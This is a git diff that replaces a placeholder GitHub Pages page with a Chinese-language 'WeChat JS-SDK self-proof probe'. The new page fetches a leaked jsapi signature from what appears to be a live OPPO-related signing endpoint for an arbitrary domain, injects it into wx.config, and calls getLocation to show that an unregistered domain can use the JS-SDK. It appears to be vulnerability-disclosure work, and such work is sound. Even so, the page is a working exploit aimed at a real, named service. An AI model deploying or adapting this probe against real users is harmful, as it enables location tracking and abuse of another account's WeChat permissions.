@@ -1,11 +1,84 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
+<!doctype html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>GitHub Pages测试页</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>JSSDK Self-Proof Probe</title>
+<script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
+<style>
+body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;padding:14px;font-size:15px;line-height:1.6}
+h3{margin:16px 0 6px}
+.box{background:#f5f5f5;border-radius:8px;padding:10px;margin:8px 0;white-space:pre-wrap;word-break:break-all;font-size:13px}
+.ok{color:#0a7d28;font-weight:bold}
+.bad{color:#c00;font-weight:bold}
+.warn{color:#b36b00;font-weight:bold}
+code{background:#eee;padding:1px 4px;border-radius:4px}
+button{padding:10px 16px;font-size:15px;border-radius:8px;border:1px solid #ccc;background:#fff}
+</style>
 </head>
 <body>
-    <h1>Hello GitHub Pages！</h1>
-    <p>你的网页已经成功运行啦</p>
+<h1>微信 JS-SDK 自证探针</h1>
+<p>本页来自 <b>你自己的探针域名</b>(非 OPPO 域)。它请求一个第三方签名接口,拿回 <code>appId+timestamp+nonceStr+signature</code>,注入 <code>wx.config</code>,看是否 <span class="ok">ready</span>。</p>
+<p>若本页域名<b>从未在公众号后台登记为 JS 安全域名</b>,而 <code>wx.config</code> 仍显示 <span class="ok">ready</span>,即证明:签名接口可为任意域签名、且微信客户端接受 → 任意域可调起 JS-SDK。</p>
+
+<h3>① 环境</h3>
+<div class="box" id="env">检测中...</div>
+
+<h3>② 签名接口原始返回(rawString 含 jsapi_ticket)</h3>
+<div class="box" id="sig">请求中...</div>
+
+<h3>③ wx.config 结果</h3>
+<div class="box" id="cfg">等待...</div>
+
+<h3>④ JSAPI 实调(checkJsApi / getLocation)</h3>
+<div class="box" id="loc">等待...</div>
+
+<p><button id="retry">重新测试</button></p>
+
+<script>
+function out(id,txt,cls){var e=document.getElementById(id);e.innerHTML=cls?'<span class="'+cls+'">'+txt+'</span>':txt;}
+function setSig(txt,cls){out('sig',txt,cls);}
+
+var ua = navigator.userAgent;
+var inWx = /MicroMessenger/i.test(ua);
+var pageUrl = location.href.split('#')[0];
+
+function run(){
+  out('env','UA: '+ua+'\n页面URL(签名用): '+pageUrl+'\n微信内: '+(inWx?'是':'否 — 必须在手机微信里打开本页!'), inWx?'ok':'bad');
+  out('cfg','等待...'); out('loc','等待...'); setSig('请求中...');
+
+  var signApi = "https://oppo.t5a.cn/common/wxjssdk_member.php?url=" + encodeURIComponent(pageUrl);
+  fetch(signApi).then(function(r){return r.json();}).then(function(d){
+    setSig(JSON.stringify(d,null,2));
+    if(!d.signature){ out('cfg','签名接口未返回 signature', 'bad'); return; }
+    if(!inWx){ out('cfg','不在微信内 — 请用手机微信扫码/打开本页再试', 'warn'); return; }
+
+    wx.config({
+      debug: true,
+      appId: d.appId,
+      timestamp: d.timestamp,
+      nonceStr: d.nonceStr,
+      signature: d.signature,
+      jsApiList: ['getLocation','checkJsApi','scanQRCode']
+    });
+    wx.ready(function(){
+      out('cfg','\u2705 wx.config = ready(客户端接受了泄漏签名!)', 'ok');
+      wx.checkJsApi({jsApiList:['getLocation'],success:function(res){
+        out('loc','checkJsApi: '+JSON.stringify(res));
+      }});
+      wx.getLocation({type:'wgs84',success:function(res){
+        out('loc','\u2705 getLocation 成功 → '+JSON.stringify(res),'ok');
+      },fail:function(res){
+        out('loc','getLocation 失败 → '+JSON.stringify(res),'bad');
+      }});
+    });
+    wx.error(function(res){
+      out('cfg','\u274c wx.config 失败 → '+JSON.stringify(res),'bad');
+    });
+  }).catch(function(e){ setSig('请求失败: '+e,'bad'); });
+}
+document.getElementById('retry').onclick = run;
+run();
+</script>
 </body>
 </html>
